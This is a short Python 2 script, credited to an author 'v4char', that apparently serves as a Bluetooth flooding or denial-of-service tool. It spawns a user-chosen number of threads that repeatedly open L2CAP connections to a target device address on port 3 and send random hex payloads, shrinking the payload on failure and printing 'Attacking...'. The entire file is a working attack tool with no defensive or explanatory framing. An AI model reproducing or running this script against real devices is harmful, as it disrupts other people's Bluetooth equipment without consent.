#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: v4char
# Email: v4char@gmail.com

import bluetooth
import sys
import threading
import random
import string

characters = 16

if len(sys.argv) >= 3:

   def generate(length):
      return ''.join(random.choice(string.hexdigits) for i in range(length))

   def loop():
      global characters
      try:
         while 1:
            s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
            s.connect((sys.argv[1] ,3))
            buff = (generate(8).decode("hex"))*characters
            s.send(buff)
            s.close()
      except:
         s.close
               
   def main(thread):
      threads = list()
      for i in range(thread):
         t = threading.Thread(target=loop)
         threads.append(t)
         t.start()


   def get_length():
      global characters
      while 1:
         try:
            s = bluetooth.BluetoothSocket (bluetooth.L2CAP)
            s.connect((sys.argv[1] ,3))
            buff = (generate(8).decode("hex"))*characters
            s.send(buff)
            s.close
            print "Attacking...\n"
            main(int(sys.argv[2]))
         except:
            characters = characters - 1
	

   get_length()

else:
   print "Error!";
